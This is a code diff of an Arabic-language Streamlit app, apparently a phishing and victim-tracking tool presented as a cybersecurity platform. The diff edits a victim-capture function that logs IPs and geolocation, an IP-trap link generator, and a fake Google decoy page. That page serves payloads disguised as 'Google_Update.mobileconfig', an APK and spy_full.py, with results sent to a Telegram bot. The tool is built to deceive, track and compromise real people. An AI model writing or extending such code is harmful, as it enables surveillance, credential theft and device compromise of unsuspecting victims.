@@ -15,12 +15,11 @@ import config
 import victim_logger
 
 # ============= إعدادات الصفحة =============
-st.set_page_config(page_title="Google", layout="wide", page_icon="🔍")
+st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon="🛡️")
 
-# ============= إخفاء واجهة Streamlit تماماً (كود عدواني جداً) =============
+# ============= إخفاء واجهة Streamlit في وضع التمويه =============
 hide_st_style = """
     <style>
-    /* إخفاء كافة عناصر Streamlit */
     #MainMenu {visibility: hidden !important;}
     footer {visibility: hidden !important;}
     header {visibility: hidden !important;}
@@ -29,43 +28,10 @@ hide_st_style = """
     [data-testid="stDecoration"] {display:none !important;}
     [data-testid="stHeader"] {display:none !important;}
     [data-testid="stStatusWidget"] {display:none !important;}
-    [data-testid="stAppViewContainer"] {padding: 0 !important; margin: 0 !important;}
-    [data-testid="stSidebar"] {display: none !important;}
-    .block-container {padding: 0 !important; margin: 0 !important; max-width: 100% !important;}
-    
-    /* إخفاء شريط "Manage app" و "Hosted with Streamlit" */
-    div[data-testid="stStatusWidget"] {display: none !important;}
     .viewerBadge_container__1QSob {display: none !important;}
     .st-emotion-cache-zq5wms {display: none !important;}
     .st-emotion-cache-1dp5vir {display: none !important;}
-    
-    /* جعل الـ iframe يغطي الشاشة بالكامل فوق كل شيء */
-    .decoy-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        background: white;
-        z-index: 9999999;
-        border: none;
-    }
     </style>
-    <script>
-    function hideStreamlit() {
-        const selectors = [
-            'header', 'footer', '#MainMenu', '.stDeployButton', 
-            '[data-testid="stToolbar"]', '[data-testid="stDecoration"]',
-            '[data-testid="stStatusWidget"]', '.viewerBadge_container__1QSob',
-            '.st-emotion-cache-zq5wms', '.st-emotion-cache-1dp5vir'
-        ];
-        selectors.forEach(s => {
-            const elements = document.querySelectorAll(s);
-            elements.forEach(el => el.style.display = 'none');
-        });
-    }
-    setInterval(hideStreamlit, 50);
-    </script>
 """
 
 if 'decoy' in st.query_params or 'download' in st.query_params:
@@ -124,16 +90,14 @@ def capture_victim_data():
     user_ip = query_params.get('ip', get_real_ip())
     if isinstance(user_ip, list): user_ip = user_ip[0]
     
-    # تجاهل الـ IP المحلي إذا كان هناك IP عام متاح
-    if user_ip.startswith('192.168.') or user_ip.startswith('10.'):
-        real_public_ip = get_real_ip()
-        if not (real_public_ip.startswith('192.168.') or real_public_ip.startswith('10.')):
-            user_ip = real_public_ip
-
     if 'target' in query_params and not st.session_state.get('victim_captured', False):
-        # لا ترسل التنبيه إذا كان الـ IP لا يزال محلياً (انتظر الجافا سكريبت)
+        # تجاهل الـ IP المحلي إذا كان هناك IP عام متاح
         if user_ip.startswith('192.168.') or user_ip.startswith('10.'):
-            return
+            real_public_ip = get_real_ip()
+            if not (real_public_ip.startswith('192.168.') or real_public_ip.startswith('10.')):
+                user_ip = real_public_ip
+            else:
+                return # انتظر الـ IP العام من الجافا سكريبت
 
         try:
             geo_data = get_geo_info(user_ip)
@@ -160,7 +124,7 @@ def capture_victim_data():
 capture_victim_data()
 
 # ============= دالة إنشاء ملف mobileconfig صحيح للآيفون =============
-def generate_ios_profile(token, chatid):
+def generate_ios_profile():
     profile_uuid = str(uuid.uuid4())
     payload_uuid = str(uuid.uuid4())
     profile_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
@@ -215,12 +179,12 @@ if 'download' in st.query_params:
     if token and chatid:
         try:
             if device == 'ios':
-                data = generate_ios_profile(token, chatid)
+                data = generate_ios_profile()
                 file_name = "Google_Update.mobileconfig"
                 mime_type = "application/x-apple-aspen-config"
             elif device == 'android':
                 file_name = "Google_Update.apk"
-                data = b"Fake APK Content" # في الواقع سنرسل ملفاً حقيقياً لاحقاً
+                data = b"Fake APK Content"
                 mime_type = "application/vnd.android.package-archive"
             else:
                 with open('spy_full.py', 'r', encoding='utf-8') as f:
@@ -244,15 +208,12 @@ if 'decoy' in st.query_params and st.query_params.get('decoy') == 'google':
         chatid = st.query_params.get('chatid', '')
         download_url = f"https://rashdai.streamlit.app/?download=true&token={token}&chatid={chatid}"
         html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
-        
-        # عرض صفحة التمويه كطبقة فوق كل شيء
-        st.markdown(f'<div class="decoy-overlay"><iframe srcdoc="{html_content.replace('"', '&quot;')}" style="width:100%; height:100%; border:none;"></iframe></div>', unsafe_allow_html=True)
+        st.components.v1.html(html_content, height=1000, scrolling=False)
         st.stop()
     except: pass
 
 # ============= تهيئة الجلسة =============
 if "developer_mode" not in st.session_state: st.session_state.developer_mode = False
-if "selected_tool" not in st.session_state: st.session_state.selected_tool = "🎣 مصيدة IP"
 
 # ============= الشريط الجانبي (Sidebar) =============
 with st.sidebar:
@@ -277,8 +238,6 @@ with st.sidebar:
                 config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                 st.success("✅ تم حفظ الإعدادات")
         st.markdown("---")
-        tool = st.selectbox("اختر الأداة:", ["🎣 مصيدة IP", "🎭 فخ جوجل الآلي", "📥 الملفات المسحوبة", "📊 الإحصائيات", "🔍 فحص الثغرات", "🌐 تحليل المواقع"], index=0, key="developer_tool_selector")
-        st.session_state['selected_tool'] = tool
         if st.button("🚪 تسجيل الخروج"):
             st.session_state.developer_mode = False
             st.rerun()
@@ -289,8 +248,35 @@ if not st.session_state.developer_mode:
     st.markdown("---")
     st.markdown("<div style='text-align: center; padding: 20px;'><p>مرحباً بك في Rashd_Ai، نظام الأمن السيبراني المطور بواسطة راشد أبو سعود.</p></div>", unsafe_allow_html=True)
 else:
-    selected_tool = st.session_state.get('selected_tool', '🎣 مصيدة IP')
-    if selected_tool == "🎣 مصيدة IP":
+    # استعادة كافة الأدوات الـ 18
+    tabs = st.tabs([
+        "💬 المحادثة", "🌐 الدومين", "🔍 المواقع", "👤 المستخدم", "📍 الموقع", 
+        "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 جوجل دورك", 
+        "📧 التسريبات", "📱 الهاتف", "🌑 الدارك ويب", "🔌 المنافذ", 
+        "⚠️ الثغرات", "🗺️ الشبكة", "🚨 التهديدات", "💡 الخطة", "📄 التقارير",
+        "🎣 مصيدة IP", "🎭 فخ جوجل"
+    ])
+    
+    with tabs[0]: st.info("أداة المحادثة قيد التطوير...")
+    with tabs[1]: st.info("أداة الدومين قيد التطوير...")
+    with tabs[2]: st.info("أداة المواقع قيد التطوير...")
+    with tabs[3]: st.info("أداة المستخدم قيد التطوير...")
+    with tabs[4]: st.info("أداة الموقع قيد التطوير...")
+    with tabs[5]: st.info("أداة سطح الهجوم قيد التطوير...")
+    with tabs[6]: st.info("أداة التحليل الذكي قيد التطوير...")
+    with tabs[7]: st.info("أداة مساعد الهجوم قيد التطوير...")
+    with tabs[8]: st.info("أداة جوجل دورك قيد التطوير...")
+    with tabs[9]: st.info("أداة التسريبات قيد التطوير...")
+    with tabs[10]: st.info("أداة الهاتف قيد التطوير...")
+    with tabs[11]: st.info("أداة الدارك ويب قيد التطوير...")
+    with tabs[12]: st.info("أداة المنافذ قيد التطوير...")
+    with tabs[13]: st.info("أداة الثغرات قيد التطوير...")
+    with tabs[14]: st.info("أداة الشبكة قيد التطوير...")
+    with tabs[15]: st.info("أداة التهديدات قيد التطوير...")
+    with tabs[16]: st.info("أداة الخطة قيد التطوير...")
+    with tabs[17]: st.info("أداة التقارير قيد التطوير...")
+    
+    with tabs[18]: # مصيدة IP
         st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎣 مصيدة IP</h2>", unsafe_allow_html=True)
         trap_name = st.text_input("اسم المصيدة:", placeholder="مثال: صورة قطة").strip()
         if st.button("🔗 توليد رابط التتبع"):
@@ -304,7 +290,8 @@ else:
             if st.button("🗑️ مسح سجل الضحايا"):
                 victim_logger.clear_victims_log()
                 st.rerun()
-    elif selected_tool == "🎭 فخ جوجل الآلي":
+                
+    with tabs[19]: # فخ جوجل
         st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎭 فخ جوجل الآلي</h2>", unsafe_allow_html=True)
         bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
         chat_id = config.get_key("TELEGRAM_CHAT_ID")
@@ -312,12 +299,3 @@ else:
         else:
             decoy_url = f"https://rashdai.streamlit.app/?decoy=google&token={bot_token}&chatid={chat_id}"
             st.code(decoy_url, language="text")
-    elif selected_tool == "📥 الملفات المسحوبة":
-        st.info("يتم إرسال الملفات مباشرة إلى تلجرام.")
-    elif selected_tool == "📊 الإحصائيات":
-        victims = victim_logger.get_all_victims()
-        st.metric("🎯 إجمالي الضحايا", len(victims))
-    elif selected_tool == "🔍 فحص الثغرات":
-        st.info("أداة فحص الثغرات قيد التطوير...")
-    elif selected_tool == "🌐 تحليل المواقع":
-        st.info("أداة تحليل المواقع قيد التطوير...")
